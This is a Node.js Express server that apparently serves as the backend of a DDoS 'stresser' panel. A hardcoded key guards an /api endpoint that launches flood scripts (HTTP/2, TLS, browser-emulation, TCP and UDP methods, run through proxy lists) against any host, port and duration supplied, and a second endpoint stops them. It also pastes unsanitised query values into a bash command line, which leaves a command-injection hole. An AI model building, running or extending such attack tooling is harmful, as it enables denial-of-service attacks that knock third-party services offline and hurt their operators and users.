const express = require('express');
const { spawn } = require('child_process');
const app = express();
const port = 2216;

const methods = {
    H2FLASH: 'H2-FLASH.js',
    H2NEYLI: 'H2-NEYLI.js',
    BROWSER: 'browsern.js',
    H2BYPASS: 'H2-BYPASS.js',
    RAW: 'Raw.js',
    H2GECKO: 'HTTP-GECKO.js',
    TLS: 'tls.js',
    TLSNET: 'Tlsnet.js',
    H2MIA: 'H2ABIB.js',
    CATMIA: 'Vzy.js',
    MIX: 'mix.js',
    MIXBIL: 'MIXBIL.js',
    H2MERIS: 'H2-MERIS.js',
    H2FLOOD: 'H2-FLOOD.js',
    TCPSSH: 'tcpssh.js',
    TCP: 'tcp.c',
    UDP: 'udp.c'
};

const activeProcesses = new Map();

const generateCommand = (method, host, port, time) => {
    switch (method) {
        case 'H2FLASH':
            return `cd /root/methods && node H2-FLASH.js ${host} ${time} 8 4 proxy.txt`;
        case 'H2FLOOD':
            return `cd /root/methods && node H2-FLOOD.js ${host} ${time} 32 4 proxy.txt`;
        case 'H2MIA':
            return `cd /root/methods && node H2ABIB.js ${host} ${time} 64 4 proxy.txt`;
        case 'CATMIA':
            return `cd /root/methods && node Vzy.js ${host} ${time} 32 4 proxy.txt`;
        case 'MIX':
            return `cd /root/methods && node mix.js ${host} ${time} 4 64 proxy.txt -v 3`;
        case 'TLS':
            return `cd /root/methods && node tls.js ${host} ${time} 64 4 proxy.txt`;
        case 'TLSNET':
            return `cd /root/methods && node Tlsnet.js ${host} ${time} 64 4 proxy.txt`;
        case 'H2GECKO':
            return `cd /root/methods && node HTTP-GECKO.js ${host} ${time} 64 4 proxy.txt`;
        case 'BROWSER':
            return `cd /root/methods && screen -dm node browsern.js ${host} ${time} 5 --fingerprint advanced`;
        case 'H2NEYLI':
            return `cd /root/methods && node H2-NEYLI.js ${host} ${time} 32 5 proxy.txt`;
        case 'MIXBIL':
            return `cd /root/methods && node MIXBIL.js ${host} ${time} 32 4 proxy.txt`;
        case 'RAW':
            return `cd /root/methods && node Raw.js ${host} ${time}`;
        case 'H2BYPASS':
            return `cd /root/methods && node H2-BYPASS.js ${host} ${time} 8 4 proxy.txt`;
        case 'H2MERIS':
            return `cd /root/methods && node H2-MERIS.js GET ${host} ${time} 4 8 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`;
        case 'TCPSSH':
            return `cd /root/methods && screen -dm node tcpssh.js ${host} ${port} root ${time}`;
        case 'UDP':
            return `cd /root/methods && gcc udp.c -o udp && ./udp ${host} ${port} ${time}`;
        case 'TCP':
            return `cd /root/methods && gcc tcp.c -o tcp && ./tcp ${host} ${port} 3 ${time}`;
        default:
            return `cd /root/methods && node ${methods[method]} ${host} ${time}`;
    }
};

app.get('/api', (req, res) => {
    const key = req.query.key;
    const host = req.query.host;
    const port = req.query.port;
    const time = req.query.time;
    const method = req.query.method;

    if (key !== 'leance') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    if (!methods[method]) {
        return res.status(400).json({ error: 'Unknown method' });
    }

    res.json({
        status: 'Attack initiated',
        host: host,
        port: port,
        time: time,
        method: method,
    });

    const command = generateCommand(method, host, port, time);
    const process = spawn('bash', ['-c', command], { detached: true });

    process.stdout.on('data', (data) => {
        console.log(`Stdout: ${data}`);
    });

    process.stderr.on('data', (data) => {
        console.error(`Stderr: ${data}`);
    });

    process.on('close', (code) => {
        console.log(`Process exited with code ${code}`);
    });

    activeProcesses.set(process.pid, process);
});

app.get('/api/stop', (req, res) => {
    const key = req.query.key;

    if (key !== 'leance') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    activeProcesses.forEach((process, pid) => {
        process.kill();
        activeProcesses.delete(pid);
    });

    res.json({ status: 'All attacks stopped.' });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
